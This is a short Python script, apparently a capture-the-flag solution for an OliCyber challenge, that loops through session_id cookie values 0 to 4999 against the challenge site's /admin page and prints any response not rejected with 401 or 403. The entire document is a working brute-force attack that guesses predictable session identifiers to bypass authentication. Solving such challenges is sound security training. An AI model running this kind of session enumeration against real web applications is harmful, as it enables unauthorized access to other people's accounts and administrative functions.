import requests

url = "http://too-small-reminder.challs.olicyber.it/"  

for i in range(5000):
    cookies = {"session_id": str(i)}
    r = requests.get(url + "/admin", cookies=cookies)

    if r.status_code != 403 and r.status_code != 401:
        print(r.text)
